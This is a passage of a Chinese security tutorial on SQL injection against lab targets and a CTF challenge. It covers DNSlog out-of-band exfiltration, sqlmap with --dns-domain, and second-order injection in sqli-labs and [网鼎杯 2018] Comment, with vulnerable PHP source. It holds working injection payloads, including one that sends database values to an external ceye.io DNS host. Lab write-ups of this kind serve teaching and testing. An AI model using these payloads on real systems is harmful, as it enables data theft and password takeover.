data-url=\"aHR0cDovLzEyNy4wLjAuMToxODg4OC9zcWxpL2xlc3MtMS8/aWQ9MSUyNyUyMGFuZCUyMChzZWxlY3QlMjBsb2FkX2ZpbGUoY29uY2F0KCUyNy8vJTI3LChzZWxlY3QlMjBoZXgodXNlcigp\">http://127.0.0.1:18888/sqli/less-1/?id=1' and (select load_file(concat('//',(select hex(user()</span>)),%<span class=\"exturl\" data-url=\"aHR0cDovLzI3LjN4dG44Yi5jZXllLmlvL2FiYyUyNw==\">27.3xtn8b.ceye.io/abc'</span>)))%23</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220215232952016.png\" alt=\"image-20220215232952016\"></p>\n<h5 id=\"使用burpdnslog快速获取全部数据\"><a class=\"markdownIt-Anchor\" href=\"#使用burpdnslog快速获取全部数据\">#</a> 使用 Burp+DNSlog 快速获取全部数据</h5>\n<p>使用 Burp 中的 intruder 模块配合 DNSlog 平台的导出功能。核心是控制 limit x,1 中的变量 x，实现自动查询下一个数据</p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xMjk5MDQwMjU=\">https://zhuanlan.zhihu.com/p/129904025</span></p>\n<p>发送 URL 到 burp 的测试器</p>\n<p>limit 0，1 后面的 0 设置为变量</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-3309297fe1795a587e808195b6582d15_720w.jpg\" alt=\"img\"></p>\n<p>payload 选择</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-a9c23d520c5668e36296576a81b3605a_720w.jpg\" alt=\"img\"></p>\n<p>线程设置为 1</p>\n<p><img data-src=\"https://pic1.zhimg.com/80/v2-82412940b45778e3dfdbcbd2fd5616a8_720w.jpg\" alt=\"img\"></p>\n<p>然后开始攻击</p>\n<p>完成以后</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-8c1ba9bd1ab38ca059d525044cb30ecb_720w.jpg\" alt=\"img\"></p>\n<p>可以在平台上查到获取到的表名</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-4da5cf686963af08917d23d77e344f3f_720w.jpg\" alt=\"img\"></p>\n<p>平台提供文件导出为 json 文件的功能</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-e825098900bde120e4699a7b23da3cf9_720w.jpg\" alt=\"img\"></p>\n<p>下载到本地，放到脚本目录</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#python3</span><br><span class=\"line\">import json</span><br><span class=\"line\"></span><br><span class=\"line\">#自己平台的地址</span><br><span class=\"line\">url = &#x27;.xxx.ceye.io&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">f = open(&#x27;./data.json&#x27;)</span><br><span class=\"line\">json_data = f.read()</span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\">data = json.loads(json_data)</span><br><span class=\"line\"></span><br><span class=\"line\">data_list = []</span><br><span class=\"line\"></span><br><span class=\"line\">for i in data:</span><br><span class=\"line\">    data_list.append(i[&#x27;name&#x27;].replace(url,&#x27;&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">data_list = list(set(data_list))</span><br><span class=\"line\">for i in data_list:</span><br><span class=\"line\">    print(i)</span><br></pre></td></tr></table></figure>\n<p>可以去重以后打印出刚才获取的数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-55e96da4d9ec9f31b14522af3a1b419e_720w.png\" alt=\"img\"></p>\n<p>1. 安装 DNS 服务器</p>\n<p>2. 添加正向查找区域</p>\n<p>区域名称为 oupeng.top</p>\n<p>3.DNS 属性中启动递归，启用简单和递归查询</p>\n<p>4. 正向查找中新建主机 ns1 IP 地址为 sqlmapIP</p>\n<p>5. 正向查找新建泛解析，地址为 sqlmapip</p>\n<p>6. 建立条件转发器，DNS 域乱写，IP 写 sqlmap 地址</p>\n<p>7.sqlmap 进攻靶机，dns-domain 写条件转发器的地址</p>\n<h5 id=\"dnslog配和sqlmap进行注入\"><a class=\"markdownIt-Anchor\" href=\"#dnslog配和sqlmap进行注入\">#</a> DNSLog 配和 Sqlmap 进行注入</h5>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220308110248704.png\" alt=\"image-20220308110248704\"></p>\n<p>MX 记录优先级高于 A 记录</p>\n<p>泛域名、泛解析：*.baidu.com 解析全部子域名</p>\n<p>1. 安装 dns 服务器</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020163942115.png\" alt=\"image-20221020163942115\"></p>\n<p>点击下一步，勾选 dns 服务器，其他选项全部默认即可</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164020385.png\" alt=\"image-20221020164020385\"></p>\n<p>连续下一步，之后点击安装，等待安装…<br>\n 安装完成之后在开始管理工具中选择 dns 管理器<br>\n右键，属性</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164223367.png\" alt=\"image-20221020164223367\"></p>\n<p>关闭禁用递归，开启简单和递归查询</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164251704.png\" alt=\"image-20221020164251704\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164324361.png\" alt=\"image-20221020164324361\"></p>\n<p>在正常查找区域中右键选择新建区域</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164355711.png\" alt=\"image-20221020164355711\"></p>\n<p>设置新建区域名称</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164422616.png\" alt=\"image-20221020164422616\"></p>\n<p>继续默认下一步就可以<br>\n进入我们设置的域名，右键，新建主机（A 记录）</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164445444.png\" alt=\"image-20221020164445444\"></p>\n<p>设置域名，这里的 ip 地址为 kali 的 ip，继续添加泛解析</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164512708.png\" alt=\"image-20221020164512708\"></p>\n<p>添加转发，dns 域随便写什么，但 IP 攻击机的地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020164603923.png\" alt=\"image-20221020164603923\"></p>\n<p>修改靶机 dns 服务器为刚刚设置的 dns 服务器</p>\n<p>sqlmap 进行注入，–dns-domian 写条件转发器中的 dns 域</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u &quot;http://192.168.13.1:18888/sqli/Less-8/index.php?id=1&quot; --technique=T --dns-domain &quot;hahaha.top&quot; -D security --tables</span><br></pre></td></tr></table></figure>\n<p>上述 sqlmap 命令作用：使用 hahaha.top 作为外带的网址。假设有台设备，kali (192.168.13.133),DNS Server (192.168.13.130), 目标靶机 (192.168.13.1)</p>\n<p>kali 上的 salmap 对目标靶机发送查询请求，并且告诉靶机将返回的内容回给 hahaha.top。由于靶机上 DNS 解析使用的是 192.168.13.130，因此靶机会将域名解析到 DNS server 上。此时 DNS Server 又设置了条件转发器，将 hahaha.top 转发给 Kali，此时 sqlmap 即可获得最终的查询结果</p>\n<p>DNSLog+Sqlmap 注入过程详解：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1545399-20190329195347336-890312924.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1884700-20210210181326467-645056694.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220308114540681.png\" alt=\"image-20220308114540681\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8wYzFjMjNkODAwOTg=\">搭建 Dnslog 平台和 Sqlmap 使用 Dns 注入 - 简书 (jianshu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3dqaHNoLm5ldC9jd2tpbGxlci1wLTEyNzk0MzkwLmh0bWw=\">使用 sqlmap 结合 dnslog 快速注入 (wjhsh.net)</span></p>\n<p>如果使用两个域名和一个 VPS 时，VPS 充当 kali，将域名解析到 kali，a 相当于 dns 服务器，b 相当于靶机</p>\n<h5 id=\"二次注入\"><a class=\"markdownIt-Anchor\" href=\"#二次注入\">#</a> 二次注入</h5>\n<p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当 Web 程序调用存储在数据库中的恶意数据并执行 SQL 查询时，就发生了 SQL 二次注入。</p>\n<p><strong>二次注入，可以概括为以下两步:</strong></p>\n<ul>\n<li>第一步：插入恶意数据<br>\n进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>\n<li>第二步：引用恶意数据<br>\n开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li>\n</ul>\n<p>（1）在 sqli_libs 的第 24 关，其页面如下所示:</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105005024-806493659.png\" alt=\"img\"></p>\n<p>（2）当我们点击 Forgot your password? 时，出现提示：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105102785-611421933.png\" alt=\"img\"></p>\n<p>（3）因此可以尝试在注册页面进行二次注入，首先，我们注册一个账号，名为：admin’#  , 密码为：123456</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105243499-1857146880.png\" alt=\"img\"></p>\n<p>（4）注册成功，尝试登录 admin‘# ，然后可以查看一下 phpmyadmin 内存储情况</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105410212-767676584.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105510664-365259773.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105550423-781051799.png\" alt=\"img\"></p>\n<p>（5）而这时的 admin 原密码是 admin，并且两个账号都存储在数据库内的。当我们重新修改 admin’# 的密码的时候，这里修改为：12345678；可以发现二次注入的威力所在。admin 的密码被修改为了：12345678；而 admin’# 用户的密码并没有发生变化。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105826556-1459172615.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1674381-20190707105908571-1427285546.png\" alt=\"img\"></p>\n<p>下面简单对代码进行一下分析：<br>\n1. 注册模块：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//$username=  $_POST[&#x27;username&#x27;] ;</span><br><span class=\"line\">$username=  mysql_escape_string($_POST[&#x27;username&#x27;]) ;</span><br><span class=\"line\">$pass= mysql_escape_string($_POST[&#x27;password&#x27;]);</span><br><span class=\"line\">$re_pass= mysql_escape_string($_POST[&#x27;re_password&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>login_create 中对所有字段均进行了严格的过滤，无法进行注入。但我们可以注册一个用户 <code>admin'#</code></p>\n<p>顺便插一句嘴，解释两个函数：</p>\n<p>mysql_escape_string 使用该函数对字符转义后插入数据库中会保留转义字符</p>\n<p>mysql_real_escape_string  使用该函数对字符转义后插入数据库中会去除转义字符</p>\n<p>因此 admin’# 虽然在 $username 中会被转义，但插入数据库中时仍保持原样。</p>\n<p>利用这个，我们创建用户 admin’#，然后用该用户登录</p>\n<p>登录后通过修改密码达成二次注入的目的。因为修改密码时我们就可以引用恶意数据</p>\n<p>在 pass_change.php 中代码如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if($pass==$re_pass)</span><br><span class=\"line\">&#123;\t</span><br><span class=\"line\">\t$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br><span class=\"line\">\t$res = mysql_query($sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;);</span><br><span class=\"line\">\t$row = mysql_affected_rows();</span><br></pre></td></tr></table></figure>\n<p>用于当前修改的是 admin’# 的密码，username 的值为 admin’#，于是语句变为下面的语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=admin&#x27;# and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>\n<p>产生的问题在于原密码被注释了，我们修改的用户从 admin’# 变为了 admin，直接不需要原始密码就可以修改管理员的密码</p>\n<p>于是二次注入产生</p>\n<h5 id=\"二次注入相关的ctf-game\"><a class=\"markdownIt-Anchor\" href=\"#二次注入相关的ctf-game\">#</a> 二次注入相关的 CTF GAME</h5>\n<h6 id=\"网鼎杯-2018comment\"><a class=\"markdownIt-Anchor\" href=\"#网鼎杯-2018comment\">#</a> [网鼎杯 2018] Comment</h6>\n<p>1. 密码爆破，自己去 burp 里面玩吧</p>\n<p>2.git 泄露</p>\n<p>git add   // 提交到缓冲区</p>\n<p>git commit -m // 提交到本地仓库</p>\n<p>git push  origin master// 提交到远端仓库</p>\n<p>当 git 泄露时可以通过 githack 还原文件</p>\n<p>git log --reflog 可以查看提交记录</p>\n<p>通过 git reset --hard 更改指针位置</p>\n<p>通过 githacker 还原文件，如果不修改文件指针的情况下回还原下面的 write_do.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;mysql.php&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;login&#x27;</span>] != <span class=\"string\">&#x27;yes&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./login.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>]))&#123;</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;write&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;comment&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>需要换一个能还原指针位置的 githacker，别用 buuoj，sbbuuoj 不让扫描</p>\n<p>最后还原出的源码是</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//write_do.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;mysql.php&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;login&#x27;</span>] != <span class=\"string\">&#x27;yes&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./login.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>]))&#123;</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;do&#x27;</span>])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;write&#x27;</span>:</span><br><span class=\"line\">    <span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;category&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$title</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;title&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into board</span></span><br><span class=\"line\"><span class=\"string\">            set category = &#x27;<span class=\"subst\">$category</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                title = &#x27;<span class=\"subst\">$title</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                content = &#x27;<span class=\"subst\">$content</span>&#x27;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;comment&#x27;</span>:</span><br><span class=\"line\">    <span class=\"variable\">$bo_id</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;bo_id&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select category from board where id=&#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    <span class=\"variable\">$num</span> = <span class=\"title function_ invoke__\">mysql_num_rows</span>(<span class=\"variable\">$result</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$num</span>&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    <span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">mysql_fetch_array</span>(<span class=\"variable\">$result</span>)[<span class=\"string\">&#x27;category&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into comment</span></span><br><span class=\"line\"><span class=\"string\">            set category = &#x27;<span class=\"subst\">$category</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                content = &#x27;<span class=\"subst\">$content</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                bo_id = &#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./comment.php?id=<span class=\"subst\">$bo_id</span>&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>注意如下代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;category&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$title</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;title&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into board set category = &#x27;<span class=\"subst\">$category</span>&#x27;, title = &#x27;<span class=\"subst\">$title</span>&#x27;,content = &#x27;<span class=\"subst\">$content</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\"><span class=\"comment\">//在插入的时候所有接收的参数都用了addslashes过滤，不存在漏洞</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"variable\">$bo_id</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;bo_id&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select category from board where id=&#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\"><span class=\"variable\">$num</span> = <span class=\"title function_ invoke__\">mysql_num_rows</span>(<span class=\"variable\">$result</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$num</span>&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\"><span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">mysql_fetch_array</span>(<span class=\"variable\">$result</span>)[<span class=\"string\">&#x27;category&#x27;</span>];    <span class=\"comment\"># 注意这行，在从数据库中取出数据时没有过滤，存在二次注入</span></span><br><span class=\"line\"><span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into comment</span></span><br><span class=\"line\"><span class=\"string\">        set category = &#x27;<span class=\"subst\">$category</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">            content = &#x27;<span class=\"subst\">$content</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">            bo_id = &#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br></pre></td></tr></table></figure>\n<p>通过上面代码分析，我们可以发现是存在二次注入，注入点在 category 中</p>\n<p>这边有点需要注意：虽然 addslashes 会转义’，但在插入数据库时转义字符 \\ 并不会插入数据库</p>\n<p>接下来构造注入语句：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023180732878.png\" alt=\"image-20221023180732878\"></p>\n<blockquote>\n<p>这个 title 可以乱写，注入点在 category 中，首先先闭合原来的 category，然后去覆盖 content，因为如果直接注释，插入数据库会报列数不匹配的错误</p>\n<p>在覆盖的同时，我们的注入语句也在自己写的 content 中</p>\n<p>最后他给的 content 随便乱写，因为被我们写的注入语句的 content 覆盖了</p>\n<p>最后的语句为：</p>\n<p>insert into board set category = ‘a\\’,content=database(),/*, title = ‘aa’,content = ‘aaaa’;</p>\n<p>此时’仍被转义，但插入数据库后转义符号消失，这就是为什么在下一个页面我们的 aaaa 正文能显示</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023181703773.png\" alt=\"image-20221023181703773\"></p>\n<p>接下来到 comment 页面，会根据刚刚的 title 查询出我们当时写的，即从数据库中取出 category，然后加上我们的提交的留言再次入库</p>\n<blockquote>\n<p>category 